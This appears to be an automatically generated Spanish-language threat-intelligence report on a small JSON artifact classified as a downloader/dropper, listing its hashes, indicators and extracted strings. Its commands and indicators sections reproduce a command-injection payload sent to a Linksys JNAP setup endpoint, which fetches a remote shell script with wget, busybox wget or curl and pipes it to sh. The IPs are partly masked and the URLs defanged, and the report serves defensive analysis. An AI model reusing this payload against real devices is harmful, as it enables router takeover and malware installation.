# 🧬 Payload Analysis

`d24019100e2d43efd92214ee6fc8e875bf9375296602550c6dcd895e5c5054d2`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d24019100e2d43efd92214ee6fc8e875bf9375296602550c6dcd895e5c5054d2`
- **SHA1:** `fa410cc284ee1add7a13ac7951cb0589431d1bf4`
- **MD5:** `e9cb9cafba88c21a82e79adc02302208`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 274 B |
| Entropía | 5.14 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap | strings |
| url | hxxp://linksys[.]com/jnap/setup/SetupWizard | strings |
| hash | d24019100e2d43efd92214ee6fc8e875bf9375296602550c6dcd895e5c5054d2 | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh | strings |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
